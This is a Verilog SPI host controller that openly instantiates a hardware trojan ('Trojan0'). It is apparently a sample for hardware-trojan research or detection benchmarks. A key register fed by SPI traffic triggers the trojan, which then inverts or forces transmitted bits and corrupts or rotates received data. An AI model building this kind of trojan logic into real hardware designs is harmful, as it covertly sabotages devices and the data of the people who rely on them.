// SPI Controller Host Circuit for Trojan0
// Simple SPI without memory blocks
module trojan0_spi_host #(
    parameter DATA_WIDTH = 8,       // SPI data width
    parameter CLOCK_DIV = 4,        // SPI clock divider
    parameter [127:0] KEY_INIT = 128'h0FEDCBA987654321123456789ABCDEF0
)(
    input wire clk,
    input wire rst,
    input wire spi_start,
    input wire [DATA_WIDTH-1:0] tx_data,
    output reg [DATA_WIDTH-1:0] rx_data,
    output reg spi_done,
    output reg spi_clk,
    output reg spi_mosi,
    input wire spi_miso,
    output reg spi_cs_n
);

    // Trojan interface (fixed width)
    wire [127:0] trojan_key;
    wire [63:0] trojan_load;
    
    // SPI state machine
    reg [2:0] spi_state;
    reg [$clog2(DATA_WIDTH)-1:0] bit_counter;
    reg [$clog2(CLOCK_DIV)-1:0] clk_counter;
    reg [DATA_WIDTH-1:0] tx_shift_reg;
    reg [DATA_WIDTH-1:0] rx_shift_reg;
    reg [127:0] key_generator;
    reg spi_clk_enable;
    
    // Key generation based on SPI transactions
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            key_generator <= KEY_INIT;
        end else if (spi_start || spi_done) begin
            // Strong feedback mixing SPI data
            key_generator <= {key_generator[126:0], 
                             key_generator[127] ^ key_generator[96] ^ key_generator[64] ^ key_generator[0] ^
                             tx_data[DATA_WIDTH-1] ^ rx_data[DATA_WIDTH-1] ^ spi_miso};
        end
    end
    
    assign trojan_key = key_generator;
    
    // SPI clock generation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            clk_counter <= {$clog2(CLOCK_DIV){1'b0}};
            spi_clk <= 1'b0;
        end else if (spi_clk_enable) begin
            clk_counter <= clk_counter + 1;
            spi_clk <= ~spi_clk;
        end else begin
            spi_clk <= 1'b0;
        end
    end
    
    // SPI state machine with trojan influence
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            spi_state <= 3'b000;
            bit_counter <= {$clog2(DATA_WIDTH){1'b0}};
            tx_shift_reg <= {DATA_WIDTH{1'b0}};
            rx_shift_reg <= {DATA_WIDTH{1'b0}};
            spi_cs_n <= 1'b1;
            spi_mosi <= 1'b0;
            spi_done <= 1'b0;
            spi_clk_enable <= 1'b0;
        end else begin
            case (spi_state)
                3'b000: begin // IDLE
                    spi_cs_n <= 1'b1;
                    spi_done <= 1'b0;
                    spi_clk_enable <= 1'b0;
                    if (spi_start) begin
                        tx_shift_reg <= tx_data;
                        bit_counter <= $clog2(DATA_WIDTH)'(DATA_WIDTH - 1);
                        spi_cs_n <= 1'b0;
                        spi_clk_enable <= 1'b1;
                        spi_state <= 3'b001;
                    end
                end
                
                3'b001: begin // TRANSMIT
                    if (spi_clk && clk_counter == 0) begin
                        // Trojan influence on transmitted data
                        if (trojan_load[7:0] == 8'hAB) begin
                            spi_mosi <= ~tx_shift_reg[bit_counter];  // Invert bit
                        end else if (trojan_load[15:8] == 8'hCD) begin
                            spi_mosi <= 1'b1;  // Force high
                        end else if (trojan_load[4:0] == 5'b10110) begin
                            spi_mosi <= 1'b0;  // Force low
                        end else begin
                            spi_mosi <= tx_shift_reg[bit_counter];  // Normal transmission
                        end
                        
                        // Receive bit
                        rx_shift_reg[bit_counter] <= spi_miso;
                        
                        if (bit_counter == 0) begin
                            spi_state <= 3'b010;
                        end else begin
                            bit_counter <= bit_counter - 1;
                        end
                    end
                end
                
                3'b010: begin // COMPLETE
                    spi_cs_n <= 1'b1;
                    spi_clk_enable <= 1'b0;
                    
                    // Trojan influence on received data
                    if (trojan_load[23:16] == 8'hEF) begin
                        rx_data <= rx_shift_reg ^ 8'hFF;  // XOR corruption
                    end else if (trojan_load[31:24] == 8'h12) begin
                        rx_data <= {rx_shift_reg[6:0], rx_shift_reg[7]};  // Bit rotation
                    end else begin
                        rx_data <= rx_shift_reg;  // Normal data
                    end
                    
                    spi_done <= 1'b1;
                    spi_state <= 3'b000;
                end
                
                default: spi_state <= 3'b000;
            endcase
        end
    end
    
    // Instantiate Trojan0
    Trojan0 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .load(trojan_load)
    );

endmodule
